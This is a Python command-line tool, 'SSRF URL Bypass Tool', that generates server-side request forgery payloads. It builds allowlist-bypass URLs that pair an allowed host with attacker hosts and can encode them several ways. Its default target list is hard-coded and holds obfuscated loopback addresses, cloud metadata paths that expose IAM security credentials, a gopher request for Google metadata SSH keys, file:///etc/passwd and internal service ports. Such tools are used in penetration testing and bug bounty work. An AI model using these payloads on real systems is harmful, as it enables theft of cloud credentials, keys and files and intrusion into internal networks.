import argparse
import os
import string
import urllib.parse

def percent_encode(payload, allowed_unencoded):
    return ''.join(c if c in allowed_unencoded else '%{:02X}'.format(ord(c)) for c in payload)

def standard_percent_encode(payload, charset):
    return ''.join(urllib.parse.quote(c, safe='') if c in charset else c for c in payload)

def unicode_escape(payload):
    exceptions = {'"', '\\', '\b', '\f', '\n', '\r', '\t'}
    result = []
    for c in payload:
        code = ord(c)
        if (0x0020 <= code <= 0x007F) or (c in exceptions):
            result.append(c)
        else:
            result.append(f'\\u{code:04x}')
    return ''.join(result)

def generate_urls(allowed, attacker_urls, encoding=None, force_http=False):
    bypasses = [
        f"https://\\\\{attacker_urls}/",
        f"https://{allowed} &@{attacker_urls}# @{attacker_urls}/",
        f"https://{allowed};.{attacker_urls}/",
        f"https://{allowed}:@{attacker_urls}/",
        f"https://{allowed}:443:\\\\@@{attacker_urls}/",
        f"https://{allowed}:443\\@{attacker_urls}/",
        f"https://{allowed}:443#{attacker_urls}/",
        f"https://{allowed}:anything@{attacker_urls}/",
        f"https://{allowed}?@{attacker_urls}/",
        f"https://{allowed}.@{attacker_urls}/",
        f"https://{allowed}..{attacker_urls}/",
        f"https://{allowed}.?.{attacker_urls}/",
        f"https://{allowed}.:.:.{attacker_urls}/",
        f"https://{allowed}.!.{attacker_urls}/",
        f"https://{allowed}.*.{attacker_urls}/",
        f"https://{allowed}.&.{attacker_urls}/",
        f"https://{allowed}.`.{attacker_urls}/",
        f"https://{allowed}.+.{attacker_urls}/",
        f"https://{allowed}.{attacker_urls}/",
        f"https://{allowed}.=.{attacker_urls}/",
        f"https://{allowed}.~.{attacker_urls}/",
        f"https://{allowed}.${attacker_urls}/",
        f"https://{allowed}[{attacker_urls}/",
        f"https://{allowed}@{attacker_urls}/",
        f"https://{allowed}\\;@{attacker_urls}/",
        f"https://{allowed}&anything@{attacker_urls}/",
        f"https://{attacker_urls}@{allowed}/",
        f"https://{attacker_urls}.example.com/",
        f"https://{attacker_urls}@{allowed}/",
        f"https://{attacker_urls}#@{allowed}/",
        f"https://{attacker_urls}#example.com/",
        f"https://{attacker_urls}%23example.com/",
        f"https://{attacker_urls}..../",
        f"https://{attacker_urls}/example.com/",
        f"https://{attacker_urls}\\example.com/",
        f"https://{attacker_urls}＆example.com/",
        f"https://{attacker_urls}%0d%0a@example.com/",
        f"https://{attacker_urls}%23@example.com/",
        f"https://{attacker_urls}%2e@example.com/",
        f"https://{attacker_urls}%2f@example.com/",
        f"https://{attacker_urls}@example.com/",
        f"https://{attacker_urls}/.example.com/",
        f"https://{attacker_urls}///example.com/",
        f"https://{attacker_urls}/\\example.com/",
        f"https://{attacker_urls}.localhost/",
        f"https://127.0.0.1/",
        f"https://localhost/",
        f"https://0000.0000.0000.0000/",
        f"https://0x7f000001/",
        f"https://2130706433/",
        f"https://{attacker_urls}:80;http://{allowed}:80/",
        f"https://{allowed}%2500.{attacker_urls}/",
        f"https://{allowed}%2e{attacker_urls}/",
        f"https://{allowed}%20@{attacker_urls}/",
        f"https://{allowed}%09@{attacker_urls}/",
        f"https://{allowed}%0a@{attacker_urls}/",
        f"https://{allowed}%0d@{attacker_urls}/",
        f"https://{allowed}%00@{attacker_urls}/",
        f"https://{allowed}%ef%bc%8e{attacker_urls}/",
        f"https://{allowed}%e3%80%82{attacker_urls}/",
        f"https://{allowed}%u3002{attacker_urls}/",
        f"https://{allowed}%c0%ae{attacker_urls}/",
        f"https://{allowed}::@{attacker_urls}/",
        f"https://{allowed}:#@{attacker_urls}/",
        f"https://{allowed}:443:@{attacker_urls}/",
        f"https://{allowed}:80.@{attacker_urls}/",
        f"https://{allowed}:80../@{attacker_urls}/",
        f"https://{allowed}:65535@{attacker_urls}/",
        f"https://{allowed}:1234@{attacker_urls}/",
        f"https://{allowed}:0@{attacker_urls}/",
        f"https://{allowed}///@{attacker_urls}/",
        f"https://{allowed}/////{attacker_urls}/",
        f"https://{allowed}/./@{attacker_urls}/",
        f"https://{allowed}/../@{attacker_urls}/",
        f"https://{allowed}/.//@{attacker_urls}/",
        f"https://{allowed}://@{attacker_urls}/",
        f"https://{allowed}/?redirect=http://{attacker_urls}/",
        f"https://{allowed}/?next=http://{attacker_urls}/",
        f"https://{allowed}/?url=http://{attacker_urls}/",
        f"https://{allowed}/?data=http://{attacker_urls}/",
        f"https://{allowed}/?path=http://{attacker_urls}/",
        f"https://{allowed}/#@{attacker_urls}/",
        f"https://{allowed}/#anything@{attacker_urls}/",
        f"https://{allowed}/@{attacker_urls}/",
    ]
    if encoding == "intruder":
        charset = [" ", ".", "/", "\\", "=", "<", ">", "?", "+", "&", "*", ";", ":", "\"", "{", "}", "|", "^", "`", "#", "-", "_", "@"]
        bypasses = [standard_percent_encode(url, charset) for url in bypasses]
    elif encoding == "everything":
        allowed_unencoded = string.ascii_letters + string.digits
        bypasses = [percent_encode(url, allowed_unencoded) for url in bypasses]
    elif encoding == "special_chars":
        charset = [c for c in map(chr, range(32, 127)) if c not in ["!","$","'","\"","(",")","*",",","-",".","/","\\",":",";","[","]","^","_","{","}","|","~"]]
        bypasses = [standard_percent_encode(url, charset) for url in bypasses]
    elif encoding == "unicode_escape":
        bypasses = [unicode_escape(url) for url in bypasses]
    if force_http:
        bypasses = [b.replace("https://", "http://") for b in bypasses]
    return bypasses

def main():
    help_text = (
        "SSRF URL Bypass Tool\n\n"
        "This tool creates various SSRF bypass formats by combining a whitelisted hostname with attacker hostnames.\n\n"
        "Arguments:\n"
        "  -al, --allowed: Whitelisted hostname (e.g., example.com)\n"
        "  -v,  --attacker: Single attacker hostname/IP.\n"
        "  -w,  --word-list: Path to a file containing attacker hosts line by line.\n"
        "  -o,  --output: Writes all results to the specified file.\n"
        "  -A,  --all: Generate payloads with all encoding methods (none + intruder + everything + special_chars + unicode_escape).\n\n"
        "Optional Encoding (ignored if -A is used):\n"
        "  intruder, everything, special_chars, unicode_escape\n\n"
        "Additional:\n"
        "  -fh, --force-http: Replaces https:// with http://.\n\n"
        "Examples:\n"
        "  python3 ssrf_maker.py --allowed example.com --attacker attacker.com\n"
        "  python3 ssrf_maker.py --allowed example.com --word-list attacker_list.txt\n"
        "  python3 ssrf_maker.py --allowed example.com --attacker attacker.com --output payload.txt\n"
        "  python3 ssrf_maker.py --allowed example.com --all\n"
    )
    parser = argparse.ArgumentParser(description=help_text, formatter_class=argparse.RawTextHelpFormatter)
    parser.add_argument("-al", "--allowed", required=True, help="Whitelisted hostname (e.g. example.com)")
    parser.add_argument("-v", "--attacker", default=None, help="Specify a single attacker hostname/IP")
    parser.add_argument("-w", "--word-list", default=None, help="Specify a file path containing attacker hosts line by line")
    parser.add_argument("-e", "--encoding", choices=["intruder", "everything", "special_chars", "unicode_escape"], help="Optional encoding type")
    parser.add_argument("-fh", "--force-http", action="store_true", help="Replace https:// with http://")
    parser.add_argument("-o", "--output", help="Write output to a file")
    parser.add_argument("-A", "--all", action="store_true", help="Generate all payloads using all encoding methods")
    args = parser.parse_args()

    default_attackers = [
        "127.0.0.1","127.0.1.3","0","127.1","127.0.1","localhost","1.0.0.127.in-addr.arpa","01111111000000000000000000000001",
        "0x7f.0x0.0x0.0x1","0177.0.0.01","7F000001","2130706433","6425673729","127001","127_0._0_1","0000::1","0000::1:80",
        "::ffff:7f00:0001","0000:0000:0000:0000:0000:ffff:7f00:0001","spoofed.burpcollaborator.net","localtest.me",
        "customer1.app.localhost.my.company.127.0.0.1.nip.io","bugbounty.dod.network","127.127.127.127","0177.0.0.1",
        "⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80","⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80","②⑧⑤②⓪③⑨①⑥⑥:80","⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80",
        "whitelisted@127.0.0.1","0x7f000001","017700000001","0177.00.00.01","0000.0000.0000.0000","0x7f.0x0.0x0.0x1",
        "0177.0000.0000.0001","0177.0001.0000..0001","0x7f.0x1.0x0.0x1","0x7f.0x1.0x1","0x7f.0x00.0x00.0x01","0177.0.0.01",
        "ht�️tp://12�7.0.0.1","localhost:+11211aaa","localhost:00011211aaaa","loopback:+11211aaa","loopback:00011211aaaa",
        "⑯⑨。②⑤④。⑯⑨｡②⑤④","169.254.169.254","2852039166","7147006462","0xa9.0xfe.0xa9.0xfe","0251.0376.0251.0376",
        "169。254。169。254","169｡254｡169｡254","⑯⑨。②⑤④。⑯⑨｡②⑤④","⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ｡⓪ⓧⓐ⑨｡⓪ⓧⓕⓔ:80","⓪ⓧⓐ⑨ⓕⓔⓐ⑨ⓕⓔ:80",
        "②⑧⑤②⓪③⑨①⑥⑥:80","④②⑤｡⑤①⓪｡④②⑤｡⑤①⓪:80","⓪②⑤①。⓪③⑦⑥。⓪②⑤①。⓪③⑦⑥:80",
        "⓪⓪②⑤①｡⓪⓪⓪③⑦⑥｡⓪⓪⓪⓪②⑤①｡⓪⓪⓪⓪⓪③⑦⑥:80","[::①⑥⑨｡②⑤④｡⑯⑨｡②⑤④]:80","[::ⓕⓕⓕⓕ:①⑥⑨。②⑤④。⑯⑨。②⑤④]:80",
        "⓪ⓧⓐ⑨。⓪③⑦⑥。④③⑤①⑧:80","⓪ⓧⓐ⑨｡⑯⑥⑧⑨⑥⑥②:80","⓪⓪②⑤①。⑯⑥⑧⑨⑥⑥②:80","⓪⓪②⑤①｡⓪ⓧⓕⓔ｡④③⑤①⑧:80",
        "dict://attacker:11111","file:///etc/passwd","file://\/\/etc/passwd","file://path/to/file",
        "gopher://metadata.google.internal:80/xGET%20/computeMetadata/v1/instance/attributes/ssh-keys%20HTTP%2f%31%2e%31%0AHost:%20metadata.google.internal%0AAccept:%20%2a%2f%2a%0aMetadata-Flavor:%20Google%0d%0a",
        "gopher://nozaki.io/_SSRF%0ATest!","0.0.0.0:22","0.0.0.0:443","0.0.0.0:80","0.0.0.0:443","0.0.0.0:3389","0000::1:22",
        "0000::1:25","0000::1:3128","0000::1:80","0000::1:3389","0177.0.0.1","0251.00376.000251.0000376","0251.0376.0251.0376",
        "0x41414141A9FEA9FE","0xA9.0xFE.0xA9.0xFE","0xA9FEA9FE","0xa9.0xfe.0xa9.0xfe","0xa9fea9fe",
        "100.100.100.200/latest/meta-data/","100.100.100.200/latest/meta-data/image-id","100.100.100.200/latest/meta-data/instance-id",
        "127.0.0.0","127.0.0.1:22","127.0.0.1:2379/version","127.0.0.1:443","127.0.0.1:80","127.0.0.1:3389","127.0.0.1:8000",
        "127.0.0.1:9901","127.0.0.1:8001","127.0.0.1:8444","127.0.1.3","127.1.1.1","127.1.1.1:80#\\@127.2.2.2:80",
        "127.1.1.1:80:\\@@127.2.2.2:80","127.1.1.1:80\\@127.2.2.2:80","127.1.1.1:80\\@@127.2.2.2:80","127.127.127.127",
        "127.127.127.127.nip.io","169.254.169.254","169.254.169.254.xip.io","169.254.169.254/computeMetadata/v1/",
        "169.254.169.254/latest/dynamic/instance-identity/document","169.254.169.254/latest/meta-data/",
        "169.254.169.254/latest/meta-data/ami-id","169.254.169.254/latest/meta-data/hostname",
        "169.254.169.254/latest/meta-data/iam/security-credentials/",
        "169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance",
        "169.254.169.254/latest/meta-data/iam/security-credentials/dummy",
        "169.254.169.254/latest/meta-data/iam/security-credentials/s3access",
        "169.254.169.254/latest/meta-data/public-keys/",
        "169.254.169.254/latest/meta-data/public-keys/0/openssh-key",
        "169.254.169.254/latest/meta-data/public-keys/[ID]/openssh-key",
        "169.254.169.254/latest/meta-data/reservation-id","169.254.169.254/latest/user-data",
        "169.254.169.254/latest/user-data/iam/security-credentials/","192.0.0.192/latest/","192.0.0.192/latest/attributes/",
        "192.0.0.192/latest/meta-data/","192.0.0.192/latest/user-data/","1ynrnhl.xip.io","2130706433","2852039166","3232235521",
        "3232235777","425.510.425.510","7147006462","[0:0:0:0:0:ffff:127.0.0.1]","[0:0:0:0:0:ffff:127.0.0.1]:8000",
        "[0:0:0:0:0:ffff:127.0.0.1]:8001","[0:0:0:0:0:ffff:127.0.0.1]:8444","[0:0:0:0:0:ffff:127.0.0.1]:9901","[::]",
        "[::]:22","[::]:25","[::]:3128","[::]:80","[::]:3389","[::]:8000","[::]:8001","[::]:8444","[::]:9901",
        "app-169-254-169-254.nip.io","bugbounty.dod.network","customer1.app.localhost.my.company.127.0.0.1.nip.io",
        "customer2-app-169-254-169-254.nip.io","instance-data","localhost:+11211aaa","localhost:00011211aaaa","localhost:22",
        "localhost:443","localhost:80","localhost:3389","localhost:8000","localhost:8001","localhost:8444","localhost:9901",
        "localhost.localdomain","loopback","loopback:22","loopback:80","loopback:443","loopback:3389","loopback:8000","loopback:9901",
        "loopback:8001","loopback:8444","localtest.me","ipcop.localdomain:8443","mail.ebc.apple.com",
        "metadata.google.internal/computeMetadata/v1/","metadata.google.internal/computeMetadata/v1/instance/hostname",
        "metadata.google.internal/computeMetadata/v1/instance/id","metadata.google.internal/computeMetadata/v1/project/project-id",
        "metadata.nicob.net"
    ]

    if args.word_list:
        if os.path.isfile(args.word_list):
            with open(args.word_list, 'r', encoding='utf-8', errors='replace') as f:
                attackers = [line.strip() for line in f if line.strip()]
        else:
            return
    elif args.attacker:
        attackers = [args.attacker]
    else:
        attackers = default_attackers

    all_results = []

    if args.all:
        encodings = [None, "intruder", "everything", "special_chars", "unicode_escape"]
        for attacker in attackers:
            for enc in encodings:
                all_results.extend(generate_urls(args.allowed, attacker, encoding=enc, force_http=args.force_http))
    else:
        for attacker in attackers:
            all_results.extend(generate_urls(args.allowed, attacker, encoding=args.encoding, force_http=args.force_http))

    if args.output:
        with open(args.output, 'w', encoding='utf-8') as f:
            for url in all_results:
                f.write(url + "\n")

    for url in all_results:
        print(url)

if __name__ == "__main__":
    main()
